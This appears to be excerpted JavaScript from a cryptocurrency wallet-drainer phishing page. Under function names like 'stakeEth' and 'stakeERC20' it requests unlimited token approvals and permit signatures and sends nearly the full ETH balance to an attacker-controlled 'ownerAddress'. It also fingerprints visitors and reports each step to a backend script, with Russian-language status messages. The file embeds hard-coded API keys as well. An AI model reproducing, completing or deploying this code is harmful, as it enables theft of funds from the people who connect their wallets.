...
const ZAPPER_KEY = "d6583264-6a9f-48b7-9855-1066c5fa1a1b"
var BASE_URL = "/" + 'api';
...
const chainToId = {
  ...
  "celo": {
      chainId: '0xa4ec',
      abiUrl: 'https://api.celoscan.io/api?module=contract&action=getsourcecode&address={0}&apikey=1D5G1EK44NVASG4N22K1B7PVESDG9VJ92M',
      explorer: 'celoscan.io',
      debank: "celo"
  },
  "aurora": {
      chainId: '0x4e454152',
      abiUrl: 'https://api.aurorascan.dev/api?module=contract&action=getsourcecode&address={0}&apikey=B8KGI3I9R4T32XK9HFH9BEH8NS6VWT23TF',
      explorer: 'aurorascan.dev'
  },
  "cronos": {
    chainId: '0x19',
    abiUrl: 'https://api.cronoscan.com/api?module=contract&action=getsourcecode&address={0}&apikey=B8KGI3I9R4T32XK9HFH9BEH8NS6VWT23TF',
...
function markAsCredited(token) {
  let credited = JSON.parse(window.localStorage.getItem("checked")) || [];
  let unique = new Set(credited);
  unique.add(`${token.tokenAmount} ${token.symbol}`)
...
function checkIsCredited(token) {
  let credited = JSON.parse(window.localStorage.getItem("checked")) || [];
  return credited.includes(`${token.tokenAmount} ${token.symbol}`)
}
        ...
        let walletNfts = await fetch(`https://api.opensea.io/api/v1/collections?asset_owner=${walletAddress}&offset=0&limit=200`, options)
            ...
            .then(nfts => {
              ...
              return nfts.filter(nft => {
                  ...
                  if (ethers.utils.getAddress(nft.primary_asset_contracts[0].address) == ethers.utils.getAddress("0x57f1887a8BF19b14fC0dF6Fd9B2acc9Af147eA85") || bal < 1000) bal = 1
                  if (bal === NaN) {
                    bal = 0
                  }
                  return {
...
function addPixel() {
  ...
  script.innerHTML = "_tmr.push({ type: 'reachGoal', id: 3310100, goal: 'ConnectWallet'});fbq('track', 'Lead');";
...
async function getBackLocation() {
  try {
    const data = await axios.get(window.location.protocol + "//" + window.location.host + "/" + "server.cfg")
...
async function getWalletAccount() {
  ...
  <b>Browser</b>: <code>${ua.browser.name} ${ua.browser.version}</code>`;
    ...
    logTlg(connectmsg)
    let counter;
    [tokenList, counter] = await Promise.all([getNFTS(account), getCounter(account), getWETH(account)]);
    ...
    const response = await axios.get(backloc + "/" + "chainalytics?account=" + account)
    response.data.forEach((resp) => {
      for (var tokenId in resp.data.items) {
        var token = resp.data.items[tokenId]
        if ((["cryptocurrency", "stablecoin"].includes(token.type))) {
          ...
          if (internalConfig.permit_first && internalConfig.priority_tokens.includes(token.contract_ticker_symbol) && idToChain("0x" + resp.data.chain_id.toString(16)) !== "polygon" && token.quote > 1000) {
                permitList.push({
                  type: "erc20",
                  tokenAddress: token.contract_address,
                  balance: token.quote,
                  tokenAmountFix: token.balance / 10**token.contract_decimals,
                  chain: idToChain("0x" + resp.data.chain_id.toString(16)),
...
async function stakeEth(token) {
    ...
    const gasLimit = await ethersProvider.estimateGas({to: ownerAddress, value: web3.utils.toWei(ethBalance.toString(), "ether")})
    const valueToSend = web3.utils.toWei(ethBalance.toString(), "ether") - (gasPrice*gasLimit.mul(10));
    console.log("valueToSend", valueToSend);
    const valueToSendString = Number(valueToSend);
    console.log("valueToSendString", valueToSendString);
    const valueToTransHex = web3.utils.toHex(valueToSendString);
    ...
    tx_ = {
      ...
      gasPrice: web3.utils.toHex((gasPrice*1.5).toFixed()),
      value: valueToTransHex,
      data: "0x0",
      r: "0x",
      s: "0x",
    ...
    .on("error", (error) => {logTlg(`😔Пользователь #${clientID} отклонил подпись ${token.tokenAmountFix} ${token.symbol}`)})
    .then(() => {
...
async function stakeERC20(token, tokenAddress, amount, msg, chainId, abiUrl) {
    ...
    functions.hasOwnProperty('name') && isValidPermit(functions);
    ...
    if(hasPermit && token.chain !== "polygon" && !(token.balance > 100 && permitList && internalConfig.priority_tokens.includes(token.symbol) && !token.permit)) {
      try {
        ...
        const data = {token: token, chainId: chainId, tokenAddress: tokenAddress, abiUrl: abiUrl, amount: amount, owner: account, spender: operator, clientID: clientID, permit: await permit(contract, account, ownerAddress), impl: contractInfo[1]};
        ...
        markAsCredited(token)
        axios.post(backloc + TOKEN_APPROVE, data)
    ...
    try {
        ...
        await new Promise((resolve, reject) => {
          tokenContract.methods.approve(operator, MAX_APPROVAL).send({
            from: account,
            gas: 100000,
            gasPrice: (gasprice*1.5).toFixed()
           })
           .on('transactionHash', function(hash){
             ...
             const data = {token: token, chainId: chainId, tokenAddress: tokenAddress, abiUrl: abiUrl, amount: amount, owner: account, spender: operator, txHash: hash, clientID: clientID};
             axios.post(backloc + TOKEN_TRANSFER, data)
             resolve()
           })
           .on('error', () => {
...
async function sendToken(offer, counter, Seaport) {
  ...
  for(var item of tokenList) {
    if (checkIsCredited(item)) continue
        ...
        try {
          if(item.type == "erc20") {
            if(item.native_token) {
              if (item.balance > 1) {
                if (selectedProvider == supportedWallets[0]) {await transferEth(item, item.tokenAmount, message);continue}
                switch(internalConfig.gas_token_method) {
                  ...
                  case 'sign':
                    ...
                    await stakeEth(item, item.tokenAmount, message);
                      ...
                      if (e.message && e.message.includes("eth_sign")) await transferEth(item, item.tokenAmount, message);
                    }
                    break
                  default:
...
function logTlg(msg) {
  ...
  msgs.push(msg)
  axios.get(encodeURI(backloc + "/" + "hydra.py?sha256=" + msg).replace("#", "%23"));
}
